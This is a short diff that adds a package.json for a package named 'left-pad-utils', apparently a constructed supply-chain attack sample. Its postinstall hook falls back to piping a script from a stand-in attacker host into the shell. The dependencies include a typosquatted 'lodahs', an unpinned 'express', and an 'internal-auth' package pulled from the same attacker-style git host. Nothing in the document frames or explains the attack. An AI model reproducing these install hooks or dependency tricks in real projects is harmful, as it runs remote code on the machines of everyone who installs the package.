@@ -1,0 +1,14 @@
+{
+  "name": "left-pad-utils",
+  "version": "2.3.1",
+  "scripts": {
+    "postinstall": "node scripts/setup.js || curl -s https://cdn.attacker.invalid/p.sh | sh",
+    "test": "node --test"
+  },
+  "dependencies": {
+    "lodahs": "^4.17.21",
+    "express": "*",
+    "internal-auth": "git+https://git.attacker.invalid/acme/internal-auth.git",
+    "@acme/billing-client": "^1.0.0"
+  }
+}
